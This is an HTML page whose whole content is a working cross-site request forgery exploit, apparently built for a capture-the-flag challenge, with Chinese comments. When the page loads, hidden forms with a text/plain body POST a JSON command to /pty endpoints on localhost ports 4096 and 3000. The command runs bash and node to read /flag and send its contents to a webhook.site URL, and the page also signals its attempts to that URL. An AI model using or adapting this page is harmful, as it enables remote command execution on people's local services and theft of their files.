<!DOCTYPE html>
<html>
<body>
    <script>
        const WEBHOOK = 'https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4';
        
        // 信号确认
        fetch(`${WEBHOOK}?status=attempting_form_csrf`);

        function sendCommand(port) {
            // 构造要执行的命令
            const cmd = `node -e "fetch('${WEBHOOK}?port=${port}&flag=' + encodeURIComponent(require('fs').readFileSync('/flag', 'utf8')))"`;
            
            const payload = JSON.stringify({
                command: '/bin/bash',
                args: ['-c', cmd]
            });

            // 创建一个隐藏的 form
            const form = document.createElement('form');
            form.action = `http://127.0.0.1:${port}/pty`;
            form.method = 'POST';
            form.enctype = 'text/plain'; // 使用 text/plain 绕过复杂请求的预检

            const input = document.createElement('input');
            input.name = payload; // 将整个 JSON 作为键名，后端如果解析不严会当做 body 处理
            input.value = "";

            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }

        // 同时尝试两个可能端口
        setTimeout(() => sendCommand(4096), 1000);
        setTimeout(() => sendCommand(3000), 2000);
    </script>
</body>
</html>
